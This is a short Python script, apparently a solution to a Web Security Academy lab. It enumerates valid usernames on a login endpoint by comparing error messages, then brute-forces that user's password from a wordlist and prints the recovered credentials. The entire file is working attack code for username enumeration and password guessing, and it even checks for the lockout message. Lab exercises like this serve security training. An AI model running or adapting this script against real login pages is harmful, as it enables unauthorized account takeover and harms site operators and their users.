import requests



target = "https://ac301fbd1e01a196c0ec90bc005800d4.web-security-academy.net/login"
session_cookie = {'session': 'pxQtR1kQ7pNbrvbRHioetaiuHxgvqnL8'}


user_list = open('/opt/wordlists/pswigusers.txt', 'r')
users = [l.strip('\n') for l in user_list]
pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]



def crack():
    found_user = None
    found_pass = None
    while found_user == None:
        for user in users:
            print(f'TESTING: {user}')
            data = {'username': user, 'password': 'swag'}
            response = requests.post(target, cookies=session_cookie, data=data)
            if 'Invalid username or password' not in response.text:
                found_user = user
                print(f'FOUND USER: {user}')
                break

    for p in passwords:
        print(f'TESTING: {p}')
        data = {'username': found_user, 'password': p}
        response = requests.post(target, cookies=session_cookie, data=data)
        if 'You have made too many incorrect login attempts.' not in response.text and 'Invalid username or password.' not in response.text:
            found_pass = p
            print('\n\n' + response.text + '\n\n')
            print(f'FOUND PASSWORD: {p}')
            break
    print(f'USERNAME: {found_user}, PASSWORD: {found_pass}')

crack()